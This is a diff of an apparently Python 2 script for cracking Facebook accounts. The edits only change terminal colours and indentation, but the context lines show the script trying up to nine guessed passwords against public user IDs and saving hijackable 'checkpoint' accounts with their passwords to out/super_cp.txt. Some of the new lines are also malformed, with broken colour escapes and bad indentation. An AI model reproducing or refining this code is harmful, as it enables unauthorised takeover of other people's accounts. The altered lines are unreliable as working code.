@@ -120,15 +120,15 @@ print """
 \033[1;96m$$$$$. !\  i  i .$$$$$$$$                           $$$$$$$$. i  i  /! .$$$$$
 \033[1;96m$$$$$$   `--`--.$$$$$$$$$                           $$$$$$$$$.--'--'   $$$$$$
 \033[1;96m$$$$$$L        `$$$$$^^$$                           $$^^$$$$$'        J$$$$$$
-\033[1;96m$$$$$$$.   .'   ""~   $$$    $.                 .$  $$$   ~""   `.   .$$$$$$$
-\033[1;96m$$$$$$$$.  ;      .e$$$$$!    $$.             .$$  !$$$$$e,      ;  .$$$$$$$$
-\033[1;96m$$$$$$$$$   `.$$$$$$$$$$$$     $$$.         .$$$   $$$$$$$$$$$$.'   $$$$$$$$$
-\033[1;96m$$$$$$$$    .$$$$$$$$$$$$$!     $$`$$$$$$$$'$$    !$$$$$$$$$$$$$.    $$$$$$$$
-\033[1;96m$JT&yd$     $$$$$$$$$$$$$$$$.    $    $$    $   .$$$$$$$$$$$$$$$$     $by&TL$
-                                 \033[1;96m$    $$    $
-                                 \033[1;96m$.   $$   .$
-                                 \033[1;96m`$        $'
-                                  \033[1;96m`$$$$$$$$' 
+\033[1;96m$$$$$$$.   .'   ""~   $$$    \033[1;93m$.                 .$  \033[1;96m$$$   ~""   `.   .$$$$$$$
+\033[1;96m$$$$$$$$.  ;      .e$$$$$!    \033[1;93$$.             .$$  \033[1;96m!$$$$$e,      ;  .$$$$$$$$
+\033[1;96m$$$$$$$$$   `.$$$$$$$$$$$$     \033[1;93$$$.         .$$$   \033[1;96m$$$$$$$$$$$$.'   $$$$$$$$$
+\033[1;96m$$$$$$$$    .$$$$$$$$$$$$$!     \033[1;93$$`$$$$$$$$'$$    \033[1;96m!$$$$$$$$$$$$$.    $$$$$$$$
+\033[1;96m$JT&yd$     $$$$$$$$$$$$$$$$.    \033[1;93$    $$    $   \033[1;96m.$$$$$$$$$$$$$$$$     $by&TL$
+                                 \033[1;93m$    $$    $
+                                 \033[1;93m$.   $$   .$
+                                 \033[1;93m`$        $'
+                                  \033[1;93m`$$$$$$$$' 
 
                         \033[1;97m┍━━━━━━━━━━━━━━━━━━━━━✁━━━━━━━━━━━━━━━━━━━━┑
                         \033[1;97m|                                          \033[1;97m|
@@ -289,10 +289,10 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;36;48m🞂━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🞀" 
-	print "\x1b[1;32;40m[1] \033[1;33;40m⚡ From Public ID"
-	print "\x1b[1;32;40m[0] \033[1;33;40m⚡ Back"
-	print "\033[1;36;48m🞂━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🞀"
+	     print "\033[1;36;48m🞂━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🞀" 
+	     print "\x1b[1;32;40m[1] \033[1;33;40m⚡ From Public ID"
+	     print "\x1b[1;32;40m[0] \033[1;33;40m⚡ Back"
+	     print "\033[1;36;48m🞂━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🞀"
 	pilih_super()
 
 def pilih_super():
@@ -359,10 +359,10 @@ def pilih_super():
 				oks.append(user+pass1)
                         else:
 			        if 'www.facebook.com' in q["error_msg"]:
-				    print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'
-				    print '\x1b[1;93m[⚡⚡] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
-				    print '\x1b[1;93m[⚡⚡] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				    print '\x1b[1;93m[⚡⚡] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
+				    print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
+				    print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b ['name']
+				    print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
+				    print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass1 + '\n'
 				    cek = open("out/super_cp.txt", "a")
 				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
 				    cek.close()
@@ -381,10 +381,10 @@ def pilih_super():
 				            oks.append(user+pass2)
                                     else:
 			                   if 'www.facebook.com' in q["error_msg"]:
-				               print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'
-				               print '\x1b[1;93m[⚡⚡] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				               print '\x1b[1;93m[⚡⚡] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				               print '\x1b[1;93m[⚡⚡] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
+				               print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
+				               print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
+				               print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
+				               print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass2 + '\n'
 				               cek = open("out/super_cp.txt", "a")
 				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
 				               cek.close()
@@ -403,10 +403,10 @@ def pilih_super():
 						       oks.append(user+pass3)
                                                else:
 			                               if 'www.facebook.com' in q["error_msg"]:
-				                           print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'
-				                           print '\x1b[1;93m[⚡⚡] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                           print '\x1b[1;93m[⚡⚡] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                           print '\x1b[1;93m[⚡⚡] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
+				                           print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
+				                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
+				                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
+				                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass3 + '\n'
 				                           cek = open("out/super_cp.txt", "a")
 				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
 				                           cek.close()
@@ -425,10 +425,10 @@ def pilih_super():
 				                                   oks.append(user+pass4)
                                                            else:
 			                                           if 'www.facebook.com' in q["error_msg"]:
-				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'
-				                                       print '\x1b[1;93m[⚡⚡] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                       print '\x1b[1;93m[⚡⚡] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                       print '\x1b[1;93m[⚡⚡] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
+				                                       print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
+				                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
+				                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
+				                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass4 + '\n'
 				                                       cek = open("out/super_cp.txt", "a")
 				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
 				                                       cek.close()
@@ -447,10 +447,10 @@ def pilih_super():
 						                               oks.append(user+pass5)	
                                                                        else:
 			                                                       if 'www.facebook.com' in q["error_msg"]:
-				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'
-				                                                   print '\x1b[1;93m[⚡⚡] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                   print '\x1b[1;93m[⚡⚡] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                                   print '\x1b[1;93m[⚡⚡] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
+				                                                   print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
+				                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
+				                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
+				                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass5 + '\n'
 				                                                   cek = open("out/super_cp.txt", "a")
 				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
 				                                                   cek.close()
@@ -469,10 +469,10 @@ def pilih_super():
 				                                                           oks.append(user+pass6)
                                                                                    else:
 			                                                                   if 'www.facebook.com' in q["error_msg"]:
-				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'
-				                                                               print '\x1b[1;93m[⚡⚡] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                               print '\x1b[1;93m[⚡⚡] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                                               print '\x1b[1;93m[⚡⚡] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
+				                                                               print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
+				                                                               print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
+				                                                               print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
+				                                                               print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass6 + '\n'
 				                                                               cek = open("out/super_cp.txt", "a")
 				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
 				                                                               cek.close()
@@ -491,10 +491,10 @@ def pilih_super():
 									                               oks.append(user+pass7)
                                                                                                else:
 			                                                                               if 'www.facebook.com' in q["error_msg"]:
-				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'
-				                                                                           print '\x1b[1;93m[⚡⚡] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                                           print '\x1b[1;93m[⚡⚡] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                                                           print '\x1b[1;93m[⚡⚡] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
+				                                                                           print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
+				                                                                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
+				                                                                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
+				                                                                           print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass7 + '\n'
 				                                                                           cek = open("out/super_cp.txt", "a")
 				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
 				                                                                           cek.close()
@@ -513,10 +513,10 @@ def pilih_super():
 				                                                                                   oks.append(user+pass8)
                                                                                                            else:
 			                                                                                           if 'www.facebook.com' in q["error_msg"]:
-				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'
-				                                                                                       print '\x1b[1;93m[⚡⚡] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                                                       print '\x1b[1;93m[⚡⚡] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                                                                       print '\x1b[1;93m[⚡⚡] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
+				                                                                                       print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
+				                                                                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
+				                                                                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
+				                                                                                       print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass8 + '\n'
 				                                                                                       cek = open("out/super_cp.txt", "a")
 				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
 				                                                                                       cek.close()
@@ -535,10 +535,10 @@ def pilih_super():
 											                                       oks.append(user+pass9)
                                                                                                                        else:
 			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
-				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'
-				                                                                                                   print '\x1b[1;93m[⚡⚡] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
-				                                                                                                   print '\x1b[1;93m[⚡⚡] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				                                                                                                   print '\x1b[1;93m[⚡⚡] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
+				                                                                                                   print '\x1b[1;96m[ ✖ ] \x1b[1;94mCheckpoint'
+				                                                                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mName \x1b[1;96m    : \x1b[1;96m' + b['name']
+				                                                                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mID \x1b[1;96m      : \x1b[1;96m' + user
+				                                                                                                   print '\x1b[1;96m[⚡⚡] \x1b[1;96mPassword \x1b[1;96m: \x1b[1;96m' + pass9 + '\n'
 				                                                                                                   cek = open("out/super_cp.txt", "a")
 				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 				                                                                                                   cek.close()
